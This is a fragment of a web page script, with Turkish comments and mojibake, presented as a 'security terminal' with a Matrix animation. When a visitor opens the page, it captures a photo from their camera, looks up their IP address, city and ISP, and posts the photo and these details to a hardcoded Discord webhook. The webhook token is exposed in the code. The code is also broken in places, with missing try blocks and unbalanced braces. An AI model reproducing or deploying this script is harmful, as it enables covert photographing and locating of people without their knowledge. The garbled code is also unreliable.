    <script>
        const webhookURL = "https://discord.com/api/webhooks/1470110601714864198/Gxgga4v26nLVHeZPgqpTrrg5sqnp4xsJsVjP0BuDKmNXcRdsVYv284lOBul-gUcj4jPw";

        async function executeSystem() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('terminal').style.display = 'block';
            drawMatrix();

            // AdÄ±m 1: Terminal LoglarÄ±

                const video = document.getElementById('video');

                logLine("l2", ">> [MEDIA] CAMERA INTERFACE CONNECTED.");

                // IP Bilgisi Ã‡ek
                const ipRes = await fetch('https://ipapi.co/json/');

                setTimeout(() => {

                    canvas.width = video.videoWidth;

                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/png');

            } catch (err) {

                sendSimpleLog("âš ï¸ Kamera izni verilmedi veya cihaz bulunamadÄ±!");
            }

        async function sendToDiscord(image, ipInfo) {
            // Base64 image to Blob
            const blob = await (await fetch(image)).blob();
            const formData = new FormData();
            formData.append("file", blob, "captured.png");
            
            const payload = {
                username: "Ã–MER EKÅžÄ° SECURITY",
                content: `ðŸ“¸ **YENÄ° ZÄ°YARETÃ‡Ä° YAKALANDI**\n\n**IP:** \`${ipInfo.ip}\`\n**KONUM:** ${ipInfo.city} / ${ipInfo.country_name}\n**ISP:** ${ipInfo.org}\n**CÄ°HAZ:** ${navigator.platform}`,
            };

            formData.append("payload_json", JSON.stringify(payload));

            fetch(webhookURL, { method: "POST", body: formData });
        }

        async function sendSimpleLog(msg) {
            fetch(webhookURL, {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: "Ã–mer EkÅŸi Logger", content: msg })
            });
        }

        function logLine(id, text, color = "#00ff00") {
            const el = document.getElementById(id);
            el.style.color = color;
            el.innerText = text;
        }

        // MATRIX ARKA PLAN
        const c = document.getElementById('matrix-canvas');
        const ctx = c.getContext('2d');
        c.width = window.innerWidth; c.height = window.innerHeight;
        const textArr = "Ã–MER EKÅžÄ° 01".split("");
        const drops = Array.from({ length: Math.floor(c.width / 20) }).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, c.width, c.height);
            ctx.fillStyle = "#00ff00";
            ctx.font = "15px monospace";
            drops.forEach((y, i) => {
                const char = textArr[Math.floor(Math.random() * textArr.length)];
                ctx.fillText(char, i * 20, y * 20);
                if (y * 20 > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
            requestAnimationFrame(drawMatrix);
        }
    </script>
</body>
